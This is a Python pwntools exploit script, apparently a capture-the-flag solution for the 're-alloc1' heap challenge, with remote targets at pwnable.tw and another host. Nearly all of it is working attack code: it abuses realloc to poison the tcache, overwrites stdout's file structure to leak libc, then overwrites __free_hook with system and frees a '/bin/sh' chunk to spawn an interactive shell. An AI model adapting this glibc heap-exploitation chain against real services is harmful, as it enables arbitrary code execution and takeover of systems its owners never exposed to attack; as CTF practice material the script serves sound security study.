#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './re-alloc1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chall.pwnable.tw', '10106')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice: ')

def malloc(idx, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)

def malloc_0(idx):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.send(str(0))

def realloc(idx, size, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)

def realloc_0(idx):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(0))

def delete(idx):
    eat()
    p.sendline('3')
    p.recvuntil('Index:')
    p.send(str(idx))

arch = 64
challenge = './re-alloc1'

context.os = 'linux'
context.log_level = 'debug'
if arch == 64:
    context.arch = 'amd64'
if arch == 32:
    context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')
tcache = 0x405010 # one sixteenth
malloc(0,0x68,'1')
realloc_0(0)
realloc(0,0x18,'1')
delete(0)
malloc(0,0x48,'1')
realloc_0(0)
realloc(0,0x48,p64(0)+p64(0))# 或者写 realloc(0,0x48,p64(0x405280)+p64(0))
delete(0)


malloc(0,0x68, b'a' * 0x18 + p64(0x201) + p64(tcache))#size + fd
delete(0)

malloc(0,0x48,'1')
delete(0)# size 为 0x201

malloc(0,0x48, '\xff' * 0x40)
realloc(0,0x58, b'a' * 0x18 + b'\x00' * 0x20 + p64(0x81) + p64(tcache + 0x40))# change tcache fake chunk


delete(0)# tcache坏掉了，进 fastbin

stdout = 0x7ffff7fc5760 # one sixteenth
malloc(0,0x18, p64(0) + p64(0))#chunk overlap size 变成 0x81

delete(0)

malloc(0,0x78,p64(0) * 4 + p64(stdout))
malloc_0(0)
realloc(0,0x78,p64(0) * 4 + p64(stdout))
debug()


delete(0)

# malloc(0,0x58, p64(0xfbad1800) + p64(0) * 3)
malloc(0,0x58, p64(0xfbad1800) + p64(0) * 3)# \x00

p.recv(0x58)
libc.address = u64(p.recvuntil(b'\x7f').ljust(8,b'\x00')) - libc.symbols["_IO_file_jumps"]
log.success("libc.address: " + hex(libc.address))

free_hook = libc.symbols['__free_hook']
log.success("__free_hook: " + hex(free_hook))

malloc(1,0x78, b'a' * 0x18 + p64(free_hook - 8))
delete(1)

malloc(1,0x48, b'/bin/sh\x00' + p64(libc.symbols['system']))
realloc_0(1)

p.interactive()
